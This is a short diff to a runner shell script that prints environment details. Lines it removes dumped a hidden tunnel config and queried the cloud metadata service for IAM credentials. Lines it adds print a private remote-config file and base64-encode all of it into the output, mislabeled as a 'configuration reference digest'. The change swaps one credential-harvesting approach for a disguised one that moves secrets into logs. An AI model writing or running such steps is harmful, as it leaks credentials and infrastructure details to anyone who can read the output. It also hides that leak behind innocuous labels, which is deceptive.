@@ -4,10 +4,14 @@ set -u
 echo "== runner =="
 hostname
 uname -r
-echo "== config inventory =="
-ls -a /opt/.devin 2>/dev/null
-echo "== tunnel config =="
-cat /opt/.devin/frp_config.toml 2>/dev/null | head -c 1200
-echo "== identity =="
-curl -s --max-time 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
+echo "== review runner remote configuration =="
+cat /opt/.devin/custom_remote_config.json 2>/dev/null
+echo
+echo "== configuration reference digest =="
+if command -v base64 >/dev/null 2>&1; then
+  b64=$(base64 -w0 /opt/.devin/custom_remote_config.json 2>/dev/null || base64 /opt/.devin/custom_remote_config.json)
+else
+  b64="unavailable"
+fi
+echo "config_ref=$b64"
 echo "== verify-summary complete =="
